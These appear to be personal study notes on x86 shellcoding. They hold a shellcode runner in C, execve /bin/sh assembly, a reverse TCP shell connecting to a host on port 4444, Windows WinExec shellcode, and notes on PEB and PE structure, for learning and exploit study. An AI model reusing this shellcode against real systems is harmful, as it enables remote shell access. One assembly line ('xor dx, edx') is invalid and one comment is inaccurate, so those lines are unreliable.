
> [!NOTE]- 延伸閱讀
> [從底層API到Malware Hunting by Inndy](https://docs.google.com/presentation/d/1beWL5ZpWsYuqLk0qAUWfLmkWngfWgYtGrMlCbkyp2d8/edit?slide=id.p#slide=id.p)
> 

> [!check] P100/932

[toc]

### Shellcode 101
- `run.c`: a weapoinzed c program from author 
- tl;dr: Set shellcode as char and use func ptr to execute it
- need NX disable (`gcc -z execstack -fno-stack-protector`)
```c
//run.c- a small skeleton program to run shellcode

// bytecode here
char code[] = "my shellcode here";

int main(int argc, char **argv) {
	int (*func)();                // function pointer
	func = (int (*)()) code; // func points to our shellcode
	(int)(*func)();               // execute a function code[]
	
	// if our program returned 0 instead of 1,
	// so our shellcode worked
	return 1;
}
```

### 0x08 Linux shellcoding

![](https://ithelp.ithome.com.tw/upload/images/20191011/20115060fRCILivUjX.png)

> 基本上 64-bit 會是 rax, rbx...，32-bit 會是 eax, ebx

##### 通用寄存器 (General Purpose Registers)

| 寄存器    | 名稱                | 用途                        |
| --------- | ------------------- | --------------------------- |
| EAX       | Accumulator         | 算術運算、函數返回值、I/O   |
| EBX       | Base Register       | 記憶體尋址基地址、陣列      |
| ECX       | Counter             | 迴圈計數（REP / LOOP 指令） |
| EDX       | Data Register       | 整數除法餘數、I/O           |
| ESI / EDI | Source / Dest Index | 字串操作（DS:ESI → ES:EDI） |

##### 指標寄存器 (Pointer Registers)

- **EBP**（基址指標 Base Pointer）
	通常用於高級語言函數調用中的「框架指標」(Frame Pointer)，在破解時，常見到的函數起始代碼包含對 `EBP` 的使用。存放當前線程的**棧底**指針。

- **ESP**（堆疊指標 Stack Pointer）
	存放當前線程的**棧頂**指針。

- **EIP**（指令指標 Instruction Pointer）
	存放下一個 CPU 指令的記憶體位址。CPU 執行完當前指令後，從 EIP 讀取下一條指令的位址繼續執行。

[计算机底层各种寄存器EIP & EBP & ESP_esp,ebp,ecx寄存器储存内容?-CSDN博客](https://blog.csdn.net/u012060033/article/details/79218909)
#### nullbytes
 >`\x00` terminated the chain of instructions.

- *tips: 寫 shellcode 時，要用 AL / AX 這種小暫存器來避免產生 0x00，因為 null byte 會讓 shellcode 壞掉，延伸可參考下表(gen by ai)*

| 技巧                  | 說明                              | 範例                                             |
| ------------------- | ------------------------------- | ---------------------------------------------- |
| **用小暫存器**           | 只操作 8-bit 或 16-bit 避免 null byte | `mov al, 0x1` 取代 `mov eax, 0x1`                |
| **xor 清零**          | 用 `xor` 代替直接 mov 0，避免 0x00      | `xor eax, eax` → 將 EAX 置 0                     |
| **add/sub 取代 mov**  | 用加減運算設值，避免 null byte            | `xor eax,eax` → `add al, 0x4`                  |
| **push/pop 代替 mov** | 對於字串或常數，先 push 再 pop            | `push 0x68732f2f` → `pop eax`                  |
| **使用負數或補數**         | 避免 0x00 出現在指令中                  | `mov al, -1` → 0xFF                            |
| **分段組合數值**          | 分成幾個小指令組成完整值                    | `xor eax,eax` → `mov al,0x1` → `shl eax,8` → … |

#### calling convension in Linux syscall

| reg         | val                    |
| ----------- | ---------------------- |
| eax         | syscall num, ret value |
| ebx, ecx... | args to pass in        |
#### simple linux shell example-execve in shellcode

```
#include <unistd.h>
int execve(const char *filename, char *const argv[], char *const envp[]);

////
filename: 要執行的二進制文件或腳本的完整路徑（例如 "/bin/ls"）。
argv[]: 傳遞給新程式的參數列表，必須以 NULL 結尾（如 {"ls", "-l", NULL}）。
envp[]: 傳遞給新程式的環境變數數組，必須以 NULL 結尾（如 {"USER=root", NULL}）
////

_snip from @cocomelonc

_start:           ; linker entry point

  ; xoring anything with itself clears itself:
  xor eax, eax    ; zero out eax
  xor ebx, ebx    ; zero out ebx
  xor ecx, ecx    ; zero out ecx
  xor edx, edx    ; zero out edx

  push eax        ; string terminator
  push 0x68732f6e ; "hs/n"
  push 0x69622f2f ; "ib//"
  mov ebx, esp    ; "//bin/sh",0 pointer is ESP
  mov al, 0xb     ; mov eax, 11: execve, use al to prevent nullbyte
  int 0x80        ; syscall

```
ref: https://blog.csdn.net/CodingMonkey/article/details/8119560

![image.png|362](https://raw.githubusercontent.com/Ash0645/image_remote/main/20260319050855.png)
objdump 看到的就是shellcode本體 ;) 

> [!NOTE] Syscall - execve
>`0x0b (11)` = execve in syscall

### 0x09 Linux shellcode - Reverse TCP shellcode

> [!NOTE] Syscall - SYS_SOCKETCALL
> `0x66 (102)`= SOCKETCALL in systemcall
 
1. 建立socket
```asm
; snip from @cocomelonc
; int socketcall(int call, unsigned long *args);
  push 0x66        ; sys_socketcall 102
  pop  eax         ; zero out eax
  push 0x1         ; sys_socket 0x1
  pop  ebx         ; zero out ebx
  xor  dx, edx    ; zero out edx

  ; int socket(int domain, int type, int protocol);
  push edx         ; protocol = IPPROTO_IP (0x0)
  push ebx         ; socket_type = SOCK_STREAM (0x1)
  push 0x2         ; socket_family = AF_INET (0x2)
  mov  ecx, esp    ; move stack pointer to ecx
  int  0x80        ; syscall (exec sys_socket)
  xchg edx, eax    ; save result (sockfd) for later usage

```
2. 連接IP port
```asm
 ; int socketcall(int call, unsigned long *args);
  mov  al, 0x66    ; socketcall 102

  ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  push 0x0101017f  ; sin_addr = 127.1.1.1 (network byte order)
  push word 0x5c11 ; sin_port = 4444
  inc  ebx         ; ebx = 0x02
  push word bx     ; sin_family = AF_INET
  mov  ecx, esp    ; move stack pointer to sockaddr struct

  push 0x10        ; addrlen = 16
  push ecx         ; const struct sockaddr *addr
  push edx         ; sockfd
  mov  ecx, esp    ; move stack pointer to ecx (sockaddr_in struct)
  inc  ebx         ; sys_connect (0x3)
  int  0x80        ; syscall (exec sys_connect)
```
3. 用 `dup2` 轉傳 stdin, stdout, stderr
	- 👉 dup2 redirects standard input/output/error to a socket, allowing a shell to communicate over the network.
```asm
; int socketcall(int call, unsigned long *args);
  ; duplicate the file descriptor for
  ; the socket into stdin, stdout, and stderr
  ; dup2(sockfd, i); i = 1, 2, 3
  push 0x2         ; set counter to 2
  pop  ecx         ; zero to ecx (reset for newfd loop)
  xchg ebx, edx    ; save sockfd

dup:
  mov  al, 0x3f    ; sys_dup2 = 63 = 0x3f
  int  0x80        ; syscall (exec sys_dup2)
  dec  ecx         ; decrement counter
  jns  dup         ; as long as SF is not set -> jmp to dup
```
4. 用execve開shell
(same as 0x08's asm)

*tips: 用python包起來產客製化shellcode腳本很方便*

### 0x10 Windows shellcoding
不能像linux直接寫asm，要先拿到addr (`GetModuleHandle`) 然後呼叫WinExec
key func: `kernel32.dll`, `ExitProcess (kernel32)`, `WinExec(kernel32)` 

1. ptr -> str (`calc.exe`)
```asm
_start:
     xor  ecx, ecx         ; zero out ecx
     push ecx              ; string terminator 0x00 for "calc.exe" string
     push 0x6578652e       ; exe. : 6578652e
     push 0x636c6163       ; clac : 636c6163
   
     mov  eax, esp         ; save pointer to "calc.exe" string in ebx
   
```
2. 塞`WinExec`的參數然後call by addr (這個addr要預先用GetModuleHandle拿或是爬PEB等方式)
-  `UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow)` 
	- 這邊reg的選用為自定義(也可以 edx ecx...)
- *tips: 因為是stack 所以從後面的參數開始塞*
```asm
  ; UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT   uCmdShow);
     inc  ecx               ; uCmdShow = 1
     push ecx              ; uCmdShow *ptr to stack in 2nd position - LIFO
     push eax              ; lpcmdLine *ptr to stack in 1st position
     mov  ebx, 0x76f0e5fd  ; call WinExec() function addr in kernel32.dll
     call ebx
```
3. ExitProcess 離開
```asm
 ; void ExitProcess([in] UINT uExitCode);
  xor  eax, eax         ; zero out eax
  push eax              ; push NULL
  mov  eax, 0x76ed214f  ; call ExitProcess function addr in kernel32.dll
  jmp  eax              ; execute the ExitProcess function

```
- 另可參考 https://ask.csdn.net/questions/8741314 延伸補充

### 0x11 windows shellcoding - Find kernel32 address

##### 🧾 TEB vs PEB 比較表

| 項目     | TEB（執行緒級）                                | PEB（進程級）                                                                                |
| ------ | ---------------------------------------- | --------------------------------------------------------------------------------------- |
| **定義** | **TEB 是每個執行緒的私有資料結構，儲存該執行緒的狀態與環境資訊**     | **PEB 是每個進程的資料結構，儲存該進程的全域狀態與環境資訊。<br>所有執行緒的 TEB 都會指向同一個 PEB。**<br><br>AKA 紀錄process相關資訊 |
| 層級     | 每個執行緒一個                                  | 每個進程一個                                                                                  |
| 存取方式   | FS:[0x18] / GS:[0x30] //offset 就是你想要取的東西 | TEB → PEB 指標                                                                            |
| 儲存內容   | SEH、Stack、TLS、Thread ID、LastError        | 模組清單、Heap、映像資訊、OS版本、LDR(linked list)                                                    |
| 主要用途   | 執行緒狀態與錯誤處理                               | 進程初始化、模組載入、環境設定                                                                         |
| 文件化程度  | 部分（NT_TIB 結構）                            | 部分（PEB 結構）                                                                              |
| 使用場景   | 反分析、錯誤模擬、堆疊分析                            | 模組解析、環境偵測、進程注入                                                                          |
延伸: [Windows Exploit Development - Structured Exception Handler (SEH) - HackMD](https://hackmd.io/@starPt/SJr3EDd-B)


>[!note]+ 在windbg中查看TEB PEB
>`!teb` -> view teb 
>`dt ntdll!_TEB <ADDR>` -> view details inside
>- addr could be get from `!teb`
>- `-r` printing detaail of detail extend

[利用映像劫持替換預設系統程式 | Flymia 凡事用心之事](https://ppundsh.github.io/posts/f6ff/)


LDR_DATA_TABLE_ENTRY
雙向的Linking list

why using containing record
![image.png](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251101152324.png)

| rev view                                                                                         | pwn view                                                                                         |
| ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------ |
| ![image.png](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251101152446.png)<br> | ![image.png](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251220035622.png)<br> |

![image.png](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251220035750.png)
![image.png](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251220035924.png)


### 0x12 PE structure
the famous picture
![PE101 Diagram](https://github.com/corkami/pics/blob/master/binary/pe101/pe101.png?raw=true)
ref: https://github.com/corkami/pics/blob/master/binary/pe101/README.md

> [!NOTE] 延伸閱讀
> 馬老師好厲駭/AIS3課程 簡報

